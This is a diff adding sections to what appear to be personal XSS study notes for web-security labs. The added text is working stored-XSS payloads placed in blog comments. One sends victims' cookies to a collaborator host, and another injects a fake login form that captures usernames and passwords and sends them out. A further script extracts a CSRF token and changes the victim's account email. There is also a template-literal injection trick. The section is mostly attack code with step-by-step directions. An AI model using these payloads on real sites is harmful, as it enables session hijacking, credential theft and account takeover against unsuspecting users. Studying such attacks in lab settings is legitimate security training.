@@ -6,6 +6,33 @@
 
 ## Methodology
 
+__stealing cookies code__
+
+after running the code below in something say like stored xss in a comment field, you can just reuse the users cookies to gain access to the site as that user
+
+```
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
+__stealing passwords with xss__
+
+same as above enter this in as a blog comment
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
 __Payloads__
 ```
 Simple
@@ -256,5 +283,75 @@ if a user clicks `x` it will work, for our use case to exploit we have to select
 ![image](https://github.com/user-attachments/assets/e00d666c-19f9-4942-a792-669ef3edac04)
 
 - we can see it added it as an href, the &apos are single quotes `'`
+
+### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+- in the case where angle brackets, singe, double quotes, and backslash and backticks are escaped in a template string we can execute JavaScript still
+
+![image](https://github.com/user-attachments/assets/17877297-6613-4330-8b34-a586f8b5912b)
+
+- enter in this payload to trigger `${alert(1)}`
+
+![image](https://github.com/user-attachments/assets/9dd49c67-0ddc-46af-872b-900b3c959cdd)
+
+
+## stealing stuff with xss
+
+### Exploiting cross-site scripting to steal cookies
+
+- place this in the blog comment section and poll the collaborator until you recieve user cookies
+
+```
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
+### Exploiting cross-site scripting to capture passwords
+
+- place this in the blog comment section and poll the collaborator until you recieve username and password
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+### Exploiting XSS to perform CSRF
+
+- login with user creds
+- view the source page and notice the updating email address functionality, this sends a POST request to /my-account/change-email
+- there is an anti-scrf token being used, which means we need to extract the CSRF token from the user account page then use it to change the victims email address
+
+![image](https://github.com/user-attachments/assets/e2efcaf2-d1e4-44dc-9705-b5314b20d228)
+
+
+- enter this into the blog comment field to have the user change their email to test@test.com
+
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+
+
+
+
 
 
